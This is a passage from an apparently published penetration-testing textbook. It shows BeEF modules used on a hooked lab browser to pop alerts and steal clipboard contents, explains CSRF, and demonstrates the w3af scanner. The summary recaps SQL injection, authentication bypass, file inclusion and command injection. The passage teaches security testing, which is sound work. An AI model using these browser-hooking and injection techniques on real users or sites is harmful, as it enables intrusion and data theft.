    a BeEF module"), navigate to **Browser** ▸ **Hooked Domain** ▸ **Create Alert
    Dialog**. At the right of the screen, you have the option to change the alert
    text. When you finish, click **Execute** at the bottom right.
  prefs: []
  type: TYPE_NORMAL
- en: '![Running a BeEF module](httpatomoreillycomsourcenostarchimages2030476.png.jpg)Figure 14-26. Running
    a BeEF module'
  prefs: []
  type: TYPE_NORMAL
- en: Turn back to your Windows 7 browser. You should see the pop-up dialog, shown
    in [Figure 14-27](ch14.xhtml#causing_an_alert_in_the_hooked_browser "Figure 14-27. Causing
    an alert in the hooked browser").
  prefs: []
  type: TYPE_NORMAL
- en: '![Causing an alert in the hooked browser](httpatomoreillycomsourcenostarchimages2030478.png.jpg)Figure 14-27. Causing
    an alert in the hooked browser'
  prefs: []
  type: TYPE_NORMAL
- en: Another interesting BeEF command allows you to steal data from the Windows clipboard.
    On the Windows 7 system, copy some text to the clipboard. Now in BeEF, navigate
    in the Commands Module Tree to **Host** ▸ **Get Clipboard**. The text on the clipboard
    is displayed in the Command Results Pane on the right, as shown in [Figure 14-28](ch14.xhtml#stealing_clipboard_information
    "Figure 14-28. Stealing clipboard information").
  prefs: []
  type: TYPE_NORMAL
- en: '![Stealing clipboard information](httpatomoreillycomsourcenostarchimages2030480.png.jpg)Figure 14-28. Stealing
    clipboard information'
  prefs: []
  type: TYPE_NORMAL
- en: In this section we have looked at only two simple examples of leveraging a hooked
    browser with BeEF. There is plenty more we can do. For example, we can use the
    target browser as a pivot to start gathering information about the local network
    with ping sweeps or even port scans. You can even integrate BeEF with Metasploit.
    On your pentests, you can use BeEF as part of social-engineering attacks. If you
    can find an XSS in your client’s web server, you can improve the results of your
    campaign by directing users not to a attacker-owned site but rather to the company
    website they trust.
  prefs: []
  type: TYPE_NORMAL
- en: Cross-Site Request Forgery
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Cross-site scripting exploits the trust a user has in a website, whereas a
    similar vulnerability class called *cross-site request forgery (CSRF)* exploits
    a website’s trust in the user’s browser. Consider this scenario: A user is logged
    in to a banking website and has an active session cookie. Naturally, the user
    is also browsing to other websites in other tabs. The user opens a malicious website
    that contains a frame or image tag that triggers a HTTP request to the banking
    website with the correct parameters to transfer funds to another account (presumably
    the attacker’s account). The banking website, of course, checks to see that the
    user is logged in. Finding that the user’s browser has a currently active session,
    the banking website executes the command in the request, and the attacker steals
    the user’s money. The user, of course, never initiated the transaction—he just
    had the misfortune of browsing to a malicious website.'
  prefs: []
  type: TYPE_NORMAL
- en: Web Application Scanning with w3af
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: It is difficult to automate testing with a tool, particularly for custom applications.
    Nothing compares to a skilled web application tester with a proxy. That said,
    several commercial web application scanners and some free and open source scanners
    can automate tasks such as crawling the website and searching for known security
    issues.
  prefs: []
  type: TYPE_NORMAL
- en: One open source web application scanner is the *Web Application Attack and Audit
    Framework (w3af)*. w3af is made up of plugins that perform different web application–testing
    tasks, such as looking for URLs and parameters to test and testing interesting
    parameters for SQL injection vulnerabilities.
  prefs: []
  type: TYPE_NORMAL
- en: Now start w3af, as shown here.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE14]'
  prefs: []
  type: TYPE_PRE
- en: The w3af GUI will be launched and should look similar to [Figure 14-29](ch14.xhtml#using_w3af
    "Figure 14-29. Using w3af"). On the left of the screen are the scan configuration
    profiles. By default you are in an empty profile, which allows you to fully customize
    which w3af plugins are run against your target. You can also use several preconfigured
    profiles. For example, the *OWASP_Top10* profile will crawl the app with plugins
    from the discovery section as well as run plugins from the audit section that
    look for vulnerabilities from the Open Web Application Security Project (OWASP)’s
    top ten vulnerability categories. Enter the URL to be scanned, as shown in [Figure 14-29](ch14.xhtml#using_w3af
    "Figure 14-29. Using w3af"), and click **Start** at the right of the window.
  prefs: []
  type: TYPE_NORMAL
- en: '![Using w3af](httpatomoreillycomsourcenostarchimages2030482.png.jpg)Figure 14-29. Using
    w3af'
  prefs: []
  type: TYPE_NORMAL
- en: As the scan runs, details will be shown in the Logs tab, and issues discovered
    will be added to the Results tab ([Figure 14-30](ch14.xhtml#w3af_results "Figure 14-30. w3af
    results")).
  prefs: []
  type: TYPE_NORMAL
- en: '![w3af results](httpatomoreillycomsourcenostarchimages2030484.png.jpg)Figure 14-30. w3af
    results'
  prefs: []
  type: TYPE_NORMAL
- en: w3af finds the SQL injection vulnerability that we exploited at the start of
    this chapter as well as some minor issues that are worth adding to your pentest
    report. You can try other w3af profiles or create your own, customizing which
    plugins are run against the app. w3af can even do a credentialed scan, in which
    it has an active logged-in session with the app, giving it access to additional
    functionality to search for issues.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: In this chapter we took a brief look at examples of common web application vulnerabilities
    in a sample application built without the input sanitation needed to mitigate
    many attacks. Our bookservice app has a SQL injection vulnerability in its books
    details page. We were able to extract data from the database and even get a system
    command shell.
  prefs: []
  type: TYPE_NORMAL
- en: We found a similar injection vulnerability in the XML-based login functionality.
    We were able to use a crafted query to bypass authentication and log in as the
    first user stored in the *AuthInfo.xml* file. We were also able to use the newsletter
    page to see the source of arbitrary pages in the web application including the
    authentication information—the result of a lack of access control on the pages
    as well as a local file inclusion issue. We were able to run commands on the system
    by chaining them with the email address to sign up for newsletters, and we were
    able to write the output of commands to a file and then access them through the
    browser. We found an example of reflective XSS in the search functionality. We
    used BeEF to leverage this XSS issue and gain control of a target browser, giving
    us a foothold in the system. Finally, we looked briefly at an open source web
    vulnerability scanner, w3af.
  prefs: []
  type: TYPE_NORMAL
- en: Web application testing deserves much more discussion than we can devote to
    it in this book. All the issues covered in this chapter are discussed in detail
    on OWASP’s website *[https://www.owasp.org/index.php/Main_Page/](https://www.owasp.org/index.php/Main_Page/)*,
    which is a good starting point for continuing your study of web application security.
    OWASP also publishes a vulnerable app, Webgoat, which uses exercises to give users
    hands-on experience exploiting web application issues like the ones in this chapter,
    as well as others. Working through Webgoat is a great next step if you want to
    learn more about testing web apps.
  prefs: []
  type: TYPE_NORMAL
- en: Another thing to note is that our application is an ASP.net application running
    on Windows. In your pentesting career, you will encounter other kinds of applications,
    such as Apache/PHP/MySQL applications running on Linux, or a Java web application.
    You may also find yourself testing applications that use APIs such as REST and
    SOAP to transfer data. Though the underlying issues caused by lack of input sanitation
    can occur on any platform, the particular coding mistakes and the syntax to exploit
    them may vary. Be sure to become familiar with different kinds of applications
    as you continue to study web application security.
  prefs: []
  type: TYPE_NORMAL
